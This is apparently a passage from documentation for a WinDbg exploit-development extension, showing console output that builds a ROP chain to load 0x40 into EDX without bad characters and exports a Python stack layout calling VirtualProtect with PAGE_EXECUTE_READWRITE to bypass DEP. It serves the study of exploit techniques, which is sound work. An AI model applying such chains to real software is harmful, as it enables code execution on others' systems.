rop += pack("<I", 0x10029697)  # pop edx
rop += pack("<I", 0x01010101)  # edx = 0x01010101
rop += pack("<I", 0x10031659)  # pop ebx
rop += pack("<I", 0xFEFEFF3F)  # ebx = 0xFEFEFF3F
rop += pack("<I", 0x10029F3E)  # add edx, ebx -> 0x00000040
rop += pack("<I", 0x41414141)  # junk (ebx side effect)
rop += pack("<I", 0x41414141)  # padding (ret 16 compensation)
rop += pack("<I", 0x41414141)  # padding (ret 16 compensation)
rop += pack("<I", 0x41414141)  # padding (ret 16 compensation)
rop += pack("<I", 0x41414141)  # padding (ret 16 compensation)

=== Value Construction ===
Type    Value       Meaning                      
------  ----------  -----------------------------
gadget  0x10029697  pop edx                      
value   0x01010101  edx = 0x01010101             
gadget  0x10031659  pop ebx                      
value   0xFEFEFF3F  ebx = 0xFEFEFF3F             
gadget  0x10029F3E  add edx, ebx -> 0x00000040   
value   0x41414141  junk (ebx side effect)       
value   0x41414141  padding (ret 16 compensation)
value   0x41414141  padding (ret 16 compensation)
value   0x41414141  padding (ret 16 compensation)
value   0x41414141  padding (ret 16 compensation)
@$osed().rop.construct("edx", 0x40, "00 0A 0D")                 : Value Construction: 10 rows
    title            : Value Construction
    rows             : Value Construction: 10 rows; expand rows[N] for details
    length           : 0xa
```

```text
0:000> dx @$osed().rop.export(1)

=== ROP Export 1 ===
#!/usr/bin/env python3
# osed-windbg ROP export — plan 1: VirtualProtect / SYNTHETIC_STDCALL_FRAME
#
# Stack layout for plan 1: VirtualProtect / SYNTHETIC_STDCALL_FRAME
# Entry path: DIRECT_API
# Status: complete-with-violations
# TODO: resolve placeholders: VIRTUALPROTECT, RETURN_ADDR, LP_ADDRESS, WRITABLE
# WARNING: dwSize: 0x00000201 contains badchar byte(s) 0x00.
# WARNING: flNewProtect = PAGE_EXECUTE_READWRITE: 0x00000040 contains badchar byte(s) 0x00.

from struct import pack
payload = b""
payload += pack("<I", VIRTUALPROTECT)  # [-4] saved-eip: saved EIP = VirtualProtect (direct overwrite)
payload += pack("<I", RETURN_ADDR)  # [+0] return-address: return address (e.g. shellcode or jmp esp)
payload += pack("<I", LP_ADDRESS)  # [+4] arg1-lpAddress: lpAddress
payload += pack("<I", 0x00000201)  # [+8] arg2-dwSize: dwSize
payload += pack("<I", 0x00000040)  # [+12] arg3-flNewProtect: flNewProtect = PAGE_EXECUTE_READWRITE
payload += pack("<I", WRITABLE)  # [+16] arg4-lpflOldProtect: lpflOldProtect (writable dummy)


=== ROP Export 1 ===
Plan  Strategy                                  Gadgets  Layout   File     
----  ----------------------------------------  -------  -------  ---------
1     VirtualProtect / SYNTHETIC_STDCALL_FRAME  1        6 slots  (console)
@$osed().rop.export(1)                 : ROP Export 1: 1 row
    title            : ROP Export 1
    rows             : ROP Export 1: 1 row; expand rows[N] for details
    length           : 0x1
```

